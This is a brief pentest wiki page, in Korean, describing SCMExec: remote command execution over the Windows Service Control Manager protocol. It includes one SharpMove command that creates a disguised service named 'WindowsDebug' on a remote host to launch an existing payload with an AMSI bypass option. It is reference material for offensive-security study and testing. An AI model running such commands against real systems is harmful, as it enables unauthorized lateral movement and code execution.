# SCMExec

{{#include ../../banners/hacktricks-training.md}}

## 작동 방식

Service Control Manager Remote Protocol (SCMR)은 원격 컴퓨터의 Windows services를 구성하고 제어하기 위한 RPC 기반 protocol입니다. 충분한 권한이 있으면 operator는 binary path에 command가 포함된 service를 생성하거나 재구성한 다음 해당 service를 시작하여 원격으로 command를 실행할 수 있습니다.<sup>[[1]](#references)</sup>

## Tools

**SharpMove**는 SCM 및 기타 여러 Windows 메커니즘을 통한 인증된 원격 실행을 지원합니다. 다음 예제에서는 SCM action을 선택하고, `WindowsDebug`라는 service를 생성하며, 원격 host에 이미 존재하는 payload를 해당 service가 가리키도록 설정합니다.<sup>[[2]](#references)</sup>
```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```
## References

- [1] [Microsoft Open Specifications - Service Control Manager Remote Protocol 개요](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [2] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
{{#include ../../banners/hacktricks-training.md}}
